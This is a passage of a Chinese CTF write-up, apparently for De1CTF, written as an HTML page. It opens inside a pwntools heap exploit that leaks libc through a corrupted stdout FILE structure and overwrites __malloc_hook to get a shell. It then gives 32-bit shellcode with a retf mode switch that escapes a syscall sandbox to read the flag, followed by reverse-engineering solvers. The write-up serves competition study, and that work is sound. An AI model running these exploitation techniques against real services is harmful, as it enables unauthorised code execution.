delete(idx):</span><br><span class="line">	p.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">	p.sendline(str(2))</span><br><span class="line">	p.recvuntil(&quot;idx :&quot;)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">	p.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">	p.sendline(str(3))</span><br><span class="line">	p.recvuntil(&quot;idx: &quot;)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(&quot;content:\n&quot;)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line">create(0,0x60,&quot;a&quot;)</span><br><span class="line">create(1,0x60,&quot;b&quot;)</span><br><span class="line">create(2,0x60,&quot;c&quot;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line">p.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;*0x1000)</span><br><span class="line">create(3,0x60,&quot;\xdd\x25&quot;)</span><br><span class="line">create(4,0x60,&quot;e&quot;)</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line">edit(1,&quot;\x00&quot;)</span><br><span class="line">create(5,0x60,&quot;f&quot;)</span><br><span class="line">create(6,0x60,&quot;f&quot;)</span><br><span class="line">file_struct = p64(0xfbad1887)+p64(0)*3+&quot;\x58&quot;</span><br><span class="line">create(7,0x60,&quot;\x00&quot;*0x33+file_struct)</span><br><span class="line">libc_addr =  u64(p.recvuntil(&quot;\x00&quot;,drop=True)[1:].ljust(8,&quot;\x00&quot;))-a.symbols[&quot;_IO_2_1_stdout_&quot;]-131</span><br><span class="line">print hex(libc_addr)</span><br><span class="line">delete(6)</span><br><span class="line">edit(6,p64(libc_addr+a.symbols[&quot;__malloc_hook&quot;]-0x23))</span><br><span class="line"></span><br><span class="line">create(8,0x60,&quot;t&quot;)</span><br><span class="line"></span><br><span class="line">create(9,0x60,&quot;a&quot;*0x13+p64(libc_addr+0xf1147))</span><br><span class="line">p.recvuntil(&quot;&gt;&gt; \n&quot;)</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.recvuntil(&quot;weapon: &quot;)</span><br><span class="line">p.sendline(str(0x60))</span><br><span class="line">p.recvuntil(&quot;index: &quot;)</span><br><span class="line">p.sendline(str(6))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="A-B-judge"><a href="#A-B-judge" class="headerlink" title="A+B judge"></a>A+B judge</h2><p>先跟各位师傅说声对不起……其实这道题没出好，本意是想出道代码审计的题目的，结果原来的库的bug比预期的多……</p>
<p>下面是一个非预期解</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    system(&quot;cat flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是一个预期解，基本思想是利用32位的syscall去绕过限制，去读取文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt; /* mmap() is defined in this header */</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">unsigned char shellcode[]= \</span><br><span class="line">&quot;\x6a\x01\xfe\x0c\x24\x68\x66\x6c\x61\x67\x89\xe3\x31\xc9\x31\xd2\x6a\x05\x58\xcd\x80\x68\x00\x38\x12\x00\x59\x89\xc3\xba\x00\x01\x00\x00\x6a\x03\x58\xcd\x80\xbb\x01\x00\x00\x00\xb9\x00\x38\x12\x00\xba\x00\x01\x00\x00\x6a\x04\x58\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80&quot;;</span><br><span class="line">/*</span><br><span class="line">push   0x1</span><br><span class="line">dec    BYTE PTR [esp]</span><br><span class="line">push   0x67616c66</span><br><span class="line">mov    ebx,esp</span><br><span class="line">xor    ecx,ecx</span><br><span class="line">xor    edx,edx</span><br><span class="line">push   0x5</span><br><span class="line">pop    eax</span><br><span class="line">int    0x80</span><br><span class="line">push   0x123800</span><br><span class="line">pop    ecx</span><br><span class="line">mov    ebx,eax</span><br><span class="line">mov    edx,0x100</span><br><span class="line">push   0x3</span><br><span class="line">pop    eax</span><br><span class="line">int    0x80</span><br><span class="line">mov    ebx,0x1</span><br><span class="line">mov    ecx,0x123800</span><br><span class="line">mov    edx,0x100</span><br><span class="line">push   0x4</span><br><span class="line">pop    eax</span><br><span class="line">int    0x80</span><br><span class="line">mov    eax,0x1</span><br><span class="line">int    0x80</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">unsigned char bypass[] = \</span><br><span class="line">&quot;\x48\x31\xe4\xbc\x00\x34\x12\x00\x67\xc7\x44\x24\x04\x23\x00\x00\x00\x67\xc7\x04\x24\x00\x30\x12\x00\xcb&quot;;</span><br><span class="line">/*</span><br><span class="line">xor rsp,rsp</span><br><span class="line">mov esp,0x123400</span><br><span class="line">mov    DWORD PTR [esp+0x4],0x23</span><br><span class="line">mov    DWORD PTR [esp],0x123000</span><br><span class="line">retf</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char* p1=mmap(0, 0x1000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</span><br><span class="line">    char* p2=mmap((void*)0x123000,0x1000,7,MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</span><br><span class="line">    memcpy(p1,bypass,sizeof(bypass));</span><br><span class="line">    memcpy(p2,shellcode,sizeof(shellcode));</span><br><span class="line">    int (*ret)() = (int(*)())p1;</span><br><span class="line">    ret();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="Re-Sign"><a href="#Re-Sign" class="headerlink" title="Re_Sign"></a>Re_Sign</h2><h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int int32_41E3D0[] = &#123; 8, 59, 1, 32, 7, 52, 9, 31, 24, 36, 19, 3, 16, 56, 9, 27, 8, 52, 19, 2, 8, 34, 18, 3, 5, 6, 18, 3, 15, 34, 18, 23, 8, 1, 41, 34, 6, 36, 50, 36, 15, 31, 43, 36, 3, 21, 65, 65 &#125;;</span><br><span class="line">	char str_41E499[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;;</span><br><span class="line">	char base64_C[49] = &#123;0&#125;;</span><br><span class="line">	for (int i = 0; i &lt; 48; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		int temp_index = int32_41E3D0[i];</span><br><span class="line">		base64_C[i] = str_41E499[temp_index - 1];</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt;&quot;base64_C:&quot;&lt;&lt; base64_C &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	char psss_list[65] = &#123; 0 &#125;;</span><br><span class="line">	char list_41E380[] = &#123; 48, 48, 48, 48, 48, 48, 48, 48, 48, 48, 91, 92, 73, 95, 90, 86, 69, 88, 93, 67, 85, 70, 82, 81, 95, 81, 80, 80, 80, 71, 70, 92, 118, 99, 108, 110, 85, 82, 67, 85, 92, 80, 95, 66, 67, 93, 79, 92, 84, 87, 85, 91, 94, 94, 90, 77, 64, 90, 76, 89, 82, 80, 21, 16 &#125;;</span><br><span class="line">	for (int i = 0; i &lt;64; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		psss_list[i] = list_41E380[i] ^ i;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; &quot;psss_list:&quot; &lt;&lt; psss_list &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	char str_re[100] = &#123;0&#125;;</span><br><span class="line">	Base64_decode(base64_C, psss_list, str_re);</span><br><span class="line">	cout &lt;&lt; &quot;flag:&quot; &lt;&lt; str_re &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	getchar();</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="output"><a href="#output" class="headerlink" title="output"></a>output</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base64_C:H6AfGzIeXjSCP3IaHzSBHhRCEFRCOhRWHAohFjxjOeqjCU==</span><br><span class="line">psss_list:0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/</span><br><span class="line">flag:de1ctf&#123;E_L4nguag3_1s_K3KeK3_N4Ji4&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Cplusplus"><a href="#Cplusplus" class="headerlink" title="Cplusplus"></a>Cplusplus</h2><blockquote>
<p>源代码<code>Cplusplus.cpp</code></p>
<p>附件<code>Cplusplus.exe</code></p>
<p>编译<code>compile.txt</code></p>
</blockquote>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">st</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> num1;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> num2;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> num3;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">st <span class="title">boostFn</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">using</span> boost::spirit::qi::_1;</span><br><span class="line">	<span class="keyword">using</span> boost::spirit::qi::ushort_;</span><br><span class="line">	<span class="keyword">using</span> boost::spirit::qi::char_;</span><br><span class="line">	<span class="keyword">using</span> boost::phoenix::ref;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">st</span> <span class="title">res</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* first = s.data();</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span> end = first + s.size();</span><br><span class="line">	<span class="keyword">bool</span> success = boost::spirit::qi::parse(first, end,</span><br><span class="line">		ushort_[ref(res.num1) = _1] &gt;&gt; <span class="keyword">char</span>(<span class="string">'@'</span>)</span><br><span class="line">		&gt;&gt; ushort_[ref(res.num2) = _1] &gt;&gt; <span class="keyword">char</span>(<span class="string">'#'</span>)</span><br><span class="line">		&gt;&gt; ushort_[ref(res.num3) = _1]</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!success || first != end) &#123;</span><br><span class="line">		<span class="comment">//throw std::logic_error("Parsing failed");</span></span><br><span class="line">		_exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码是<code>boost::spirit</code>相关，输入形如<code>num1@num2#num3</code>，用<code>@ #</code>分割三个<code>unsigned short</code>数值</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">boostFunc</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span>&amp; num)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//随机数check</span></span><br><span class="line">	<span class="comment">//预期的num是78</span></span><br><span class="line">	<span class="keyword">if</span> (num &gt; <span class="number">111</span>) &#123;</span><br><span class="line">		_exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	boost::<span class="function">mt19937 <span class="title">rng</span><span class="params">(num)</span></span>;</span><br><span class="line">	rng.discard(num % <span class="number">12</span>);</span><br><span class="line">	<span class="comment">//拷贝构造，保留了所有状态</span></span><br><span class="line">	boost::<span class="function">mt19937 <span class="title">rng_</span><span class="params">(rng)</span></span>;</span><br><span class="line">	rng_.discard(num / <span class="number">12</span>);</span><br><span class="line">	<span class="comment">//这里相当于丢弃了num个随机结果</span></span><br><span class="line">	<span class="keyword">if</span> (rng_() != <span class="number">3570126595</span>) &#123;</span><br><span class="line">		_exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	num -= (rng_() % <span class="number">45</span>);	<span class="comment">// 45</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个<code>unsigned short</code>传入，小于等于111，把它作为随机引擎的种子，丢弃掉<code>num % 12</code>个随机数，然后用一次随机引擎的拷贝构造</p>
<blockquote>
<p>注意，这里拷贝构造会完全保留随机引擎的状态，而不是回归初始状态</p>
<p>在IDA中就表现为直接一个memcpy</p>
</blockquote>
<p>接着再丢弃掉<code>num/12</code>个随机数</p>
<p>然后输出一个随机数要求等于<code>3570126595</code>，最后由于是引用，传入的数值被改变</p>
<p>后面第二段check没什么好说的</p>
<p>第三段check是我的锅</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((res.num3 % res.num1 != <span class="number">12</span>) &amp;&amp; (res.num3 / res.num1) != <span class="number">3</span>) &#123;</span><br><span class="line">		<span class="comment">//3 * 34 + 12 == 114</span></span><br><span class="line">		<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"You failed...again"</span>;</span><br><span class="line">		_exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这里出现了多解，后来排查发现是<code>||</code>被我误写为<code>&amp;&amp;</code>，因此只要满足右边的式子就会输出flag，最后加上了<code>md5</code>保证唯一解</p>
<h2 id="evil-boost"><a href="#evil-boost" class="headerlink" title="evil_boost"></a>evil_boost</h2><blockquote>
<p>源代码<code>evil_boost.cpp</code></p>
<p>附件<code>evil_boost.exe</code></p>
<p>编译<code>compile.txt</code></p>
</blockquote>
<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;boost/phoenix/phoenix.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> opt = boost::program_options;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> boost::spirit;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> phoenix;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Have you input your name??"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">	opt::<span class="function">options_description <span class="title">desc</span><span class="params">(<span class="string">"All options"</span>)</span></span>;</span><br><span class="line">	desc.add_options()</span><br><span class="line">		(<span class="string">"cplusplus,cpp"</span>, opt::value&lt;<span class="keyword">int</span>&gt;()-&gt;default_value(<span class="number">99</span>), <span class="string">"your C++ grades"</span>)</span><br><span class="line">		(<span class="string">"python,py"</span>, opt::value&lt;<span class="keyword">int</span>&gt;()-&gt;default_value(<span class="number">88</span>), <span class="string">"your python grades"</span>)</span><br><span class="line">		(<span class="string">"javascript,js"</span>, opt::value&lt;<span class="keyword">int</span>&gt;()-&gt;default_value(<span class="number">77</span>), <span class="string">"your javascript grades"</span>)</span><br><span class="line">		(<span class="string">"name"</span>, opt::value&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(), <span class="string">"your name"</span>)</span><br><span class="line">		(<span class="string">"help"</span>, <span class="string">"produce help message"</span>);</span><br><span class="line">	opt::variables_map vm;</span><br><span class="line">	<span class="comment">//解析命令行选项并把值存储到"vm"</span></span><br><span class="line">	opt::store(opt::parse_command_line(argc, argv, desc), vm);</span><br><span class="line">	opt::notify(vm);</span><br></pre></td></tr></table></figure>
<p>如代码所示，解析命令行参数并存储</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (vm.count(<span class="string">"name"</span>)) &#123;</span><br><span class="line">		<span class="built_in">std</span>::<span class="built_in">string</span> __name = vm[<span class="string">"name"</span>].as&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;();</span><br><span class="line">		<span class="keyword">char</span> c1 = vm[<span class="string">"cplusplus"</span>].as&lt;<span class="keyword">int</span>&gt;();</span><br><span class="line">		<span class="keyword">char</span> c2 = vm[<span class="string">"python"</span>].as&lt;<span class="keyword">int</span>&gt;();</span><br><span class="line">		<span class="keyword">char</span> c3 = vm[<span class="string">"javascript"</span>].as&lt;<span class="keyword">int</span>&gt;();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (vm[<span class="string">"cplusplus"</span>].as&lt;<span class="keyword">int</span>&gt;() == <span class="number">999</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (vm[<span class="string">"python"</span>].as&lt;<span class="keyword">int</span>&gt;() == <span class="number">777</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> (vm[<span class="string">"javascript"</span>].as&lt;<span class="keyword">int</span>&gt;() == <span class="number">233</span>) &#123;</span><br><span class="line">					<span class="keyword">unsigned</span> <span class="keyword">char</span> enc_false_flag[<span class="number">25</span>] = &#123;</span><br><span class="line">						<span class="number">0x4c</span>,<span class="number">0x70</span>,<span class="number">0x71</span>,<span class="number">0x6b</span>,<span class="number">0x38</span>,<span class="number">0x71</span>,<span class="number">0x6b</span>,<span class="number">0x38</span>,<span class="number">0x6c</span>,</span><br><span class="line">						<span class="number">0x70</span>,<span class="number">0x7d</span>,<span class="number">0x38</span>,<span class="number">0x6f</span>,<span class="number">0x6a</span>,<span class="number">0x77</span>,<span class="number">0x76</span>,<span class="number">0x7f</span>,<span class="number">0x38</span>,</span><br><span class="line">						<span class="number">0x7e</span>,<span class="number">0x74</span>,<span class="number">0x79</span>,<span class="number">0x7f</span>,<span class="number">0x36</span>,<span class="number">0x36</span>,<span class="number">0x36</span></span><br><span class="line">					&#125;;</span><br><span class="line">					<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++) &#123;</span><br><span class="line">						<span class="keyword">if</span> (((<span class="keyword">unsigned</span> <span class="keyword">char</span>)__name[i] ^ (<span class="keyword">char</span>)(c1 + c2 * c3)) != enc_false_flag[i]) &#123;</span><br><span class="line">							<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"error"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">							_exit(i);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"You get the flag! flag&#123;"</span> &lt;&lt; __name &lt;&lt; <span class="string">"&#125;"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">				<span class="comment">//flag&#123;This is the wrong flag...&#125;</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>如果输入了name，会获得cpp、python、JavaScript的成绩，然后解密flag，最后输出一个假的flag</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 计算表达式相关 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//为rule准备一个val变量，类型为double</span></span><br><span class="line">	<span class="comment">//准确的说：是一个phoenix类，它和其它的phoenix类组成lambda表达式，在lambda里可以看作一个double</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">calc_closure</span> :</span>boost::spirit::closure&lt;calc_closure, <span class="keyword">double</span>&gt; &#123;</span><br><span class="line">		member1 val;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="comment">//定义ContextT策略为calc_closure::context_t</span></span><br><span class="line">	rule&lt;<span class="keyword">phrase_scanner_t</span>, calc_closure::<span class="keyword">context_t</span>&gt; factor, term, <span class="built_in">exp</span>;</span><br><span class="line">	<span class="comment">//直接使用phoenix的lambda表达式作为Actor</span></span><br><span class="line">	factor = real_p[factor.val = arg1] | (<span class="string">'('</span> &gt;&gt; <span class="built_in">exp</span>[factor.val = arg1] &gt;&gt; <span class="string">')'</span>);</span><br><span class="line">	term = factor[term.val = arg1] &gt;&gt; *((<span class="string">'*'</span> &gt;&gt; factor[term.val *= arg1]) | (<span class="string">'/'</span> &gt;&gt; factor[term.val /= arg1]));</span><br><span class="line">	<span class="built_in">exp</span> = term[<span class="built_in">exp</span>.val = arg1] &gt;&gt; *((<span class="string">'+'</span> &gt;&gt; term[<span class="built_in">exp</span>.val += arg1]) | (<span class="string">'-'</span> &gt;&gt; term[<span class="built_in">exp</span>.val -= arg1]));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* szExp = vm[<span class="string">"name"</span>].as&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;().c_str();</span><br><span class="line">	<span class="keyword">double</span> result;</span><br><span class="line">	parse_info&lt;&gt;r = parse(szExp, <span class="built_in">exp</span>[assign_a(result)], space_p);</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 5e0*(5-1/5)==24</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strlen</span>(szExp) != <span class="number">11</span>) &#123;</span><br><span class="line">		_exit(<span class="built_in">strlen</span>(szExp));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> count_num = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> count_alpha = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(szExp); i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((szExp[i] &lt; <span class="string">'9'</span>) &amp;&amp; (szExp[i] &gt;= <span class="string">'0'</span>)) &#123;</span><br><span class="line">			count_num++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ((szExp[i] &gt; <span class="string">'a'</span>) &amp;&amp; (szExp[i] &lt; <span class="string">'z'</span>)) &#123;</span><br><span class="line">			count_alpha++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ((szExp[i] &gt; <span class="string">'A'</span>) &amp;&amp; (szExp[i] &lt; <span class="string">'Z'</span>)) &#123;</span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">cout</span> 